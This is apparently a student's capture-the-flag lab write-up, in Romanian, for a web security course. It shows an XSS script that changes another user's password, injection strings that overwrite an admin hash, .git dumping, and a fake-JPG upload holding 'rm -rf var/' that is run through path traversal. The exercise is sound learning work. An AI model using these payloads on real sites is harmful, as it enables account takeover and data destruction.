# Tema 2 TSSC
Chiper Alexandra-Diana, 342 C4

## Task 0
1. Vedem in ce retea suntem

```bash
$ ip a
``` 
2. Scanam reteau cu nmap

```bash
$ nmap -sn 172.29.0-255.0-255

# Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-20 20:16 UTC
# Nmap scan report for isc-server (172.29.0.1)
# Host is up (0.00027s latency).
# Nmap scan report for isc-web-escape-mysql.web-escape-3783 (172.29.0.2)
# Host is up (0.00016s latency).
# Nmap scan report for your-jail (172.29.0.4)
# Host is up (0.00020s latency).
# Nmap scan report for 172.29.0.50  <-- THISSSSS
# Host is up (0.00045s latency).
```
3. Scanam porturile deschise pe server

```bash
nmap 172.29.0.50

# Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-20 20:26 UTC
# Nmap scan report for 172.29.0.50
# Host is up (0.00013s latency).
# Not shown: 999 closed tcp ports (conn-refused)
# PORT   STATE SERVICE
# 80/tcp open  http  <-- THISSSS
```
Deci serverul e la adresa `172.29.0.50` portul `80`. Rulam scriptul in background
dat cu acesti parametrii si putem sa ne conectam din browser.

```bash
$ ./webtunnel.sh 172.19.0.50 80 &
```

## Task 1

`Flag: SpeishFlag{iZWTYDCEfEyP0dNI6ssrRIwzyy9XGkLU}`

1. Ne conectam de pe site cu credentialele cerute.
2. Inspectam elementele din pagina. Dam un `Ctrl + F` in consola dupa `Speish` si gasim flag-ul intr-un div hidden.

## Task 2

`Flag: SpeishFlag{gbQUo4ge6EYdgyPfunZYMvf6nQ8gkTpv}`

Verificam traficul de retea cu tcpdump

Observam ca de pe portul `8349` se tot primesc mesaje. 

```bash
nc -l 8349

# POST /auth/login HTTP/1.1
# Host: web-escape-3832-shell:8349
# User-Agent: curl/8.5.0
# Accept: */*
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 34

# username=guard&password=0e44da139a^C
```
Acum avem userul si parola. Ne conectam cu ele.

La sectiunea Profile > Private Messages gasim flagul.

## Task 3

`SpeishFlag{qgD7wL0c19SZVZAcsqMAy8av6pGuujpQ}`

Vom trimite un mesaj pe conversatia privata cu dekhan-ul 
care contine un script ce completeaza automat formularul 
de schimbare a parolei cand decanul va accesa pagina.

```html
<script>
  $(function () {
    // Check if the current user is 'dekhan'
    if (window.authUserName === 'dekhan') {
      console.log('Changing password for user:', window.authUserName);
      
      var newPassword = '123'; // Set the new password

      // Make an AJAX request to change the password
      $.ajax({
        url: '/inside/auth/change_password', // URL for changing the password
        type: 'POST',
        data: {
          password: newPassword,
          confirm_password: newPassword
        }
      });
    } else {
      console.log('Not the target user, script will not run.');
    }
  });
</script>
```

Cand accesam sectiunea Profile a dekhanului, dupa ce ne conectam cu noua parola,
gasim in Consola flagul si parola initiala.


## Task 4

`SpeishFlag{Pcyvb7NHzOHfmm5xyUZoEPu8WIObLi9N}`

1. show tables ca sa vedem ce tabele avem
2. Facem un select pe tabela accounts cu o conditie, dar cu DEBUG in fata ca sa vedem cum arata query-ul. Filtrarea randului rek0rului se face dupa id.
3. ca sa putem sa accesam randul rek0r-ului trebuie sa trecem peste conditia id > 1
4. Conditiile sunt legate intre ele cu AND
5. Construim o conditie care sa aiba 2 conditii in ea, prin escaparea caracterului "`"
  - structura: (o conditie fara =) + ` + OR + ` + (orice conditie cu =)
    
    ex pentru afisarea tuturor intrarilor:
    ```sql
    select, accounts, id` > 0 OR `id = 1
    ```

6. Incercam sa ne dam seama ce algoritm de hashing a fost folosit (calculam hash-ul parolei student si vedem care se potriveste. Md5 nu a mers, dar sha-1 s-a potrivit perfect pr fragmentul de parola afisat)

7. Generam hash-ul parolei "admin" cu sha-1 si modificam parola rekt0rului cu:
    ```sql
    update, accounts, password=d033e22ae348aeb5660fc2140aec35850c4da997, username` like 're%' OR `id = 1
    ```

## Task 5

`SpeishFlag{RqZQYWTlcG3aYYPZM7l0U33d1eSyrmIb}`

Am incerca sa descarc direct folderul .git din radacina site-ului, dar nu am putut.

Am ramas fara idei asa ca l-am intrebat pe chatGPT, care mi-a zis sa verific 
daca pot accesa alte fisiere din directorul .git cum ar fi .git/config.

De data aceasta am avut succes, deci am continuat cu urmatoarea recomandare, 
sa folosesc un tool precum `git-dumper` si am obtinut astfel fisierul .git/ pe 
local. Cu un `ll` am afisat continutul lui si am vazut un fisier `.git_flag`. 
THE END :sunglasses:


## Task 6

`SpeishFlag{RYf0iOSQMqqAxMA4Ldbc3BusYYO45aSK}`

In primul rand, ne conectam la contul de rekt0r. Observam ca in terminalul de 
unde am rulat scriptul de conectare ne apare un mesaj nou de la VNO. Avem o conversatie interesanta cu acesta si ne apucam de treaba.

1. Construim un script care face 
    ```bash
    rm -rf var/
    ```
2. Adaugam inainte de continutul propriu-zis headerul de fisier jpg. Folosim `echo -ne`(nu contine doar caractere ASCII). 

3. Copiem calea catre o poza postata ca sa vedem unde sunt salvate.
    ```
    http://localhost:8080/userupload/posts/payload.jpg
    ```

4. Deschidem portile

5. Din consola schimbam codul pentru butonul de fix'em si ii dam urmatorul argument
    ``` 
    ../../../../../bin/sh /var/www/userupload/posts/remove.sh
    ```

6. Ne luam flag-ul din terminal.

## =========== Feedback ===========

Foarte amuzanta tema :D. Pozele si postarile sunt geniale.
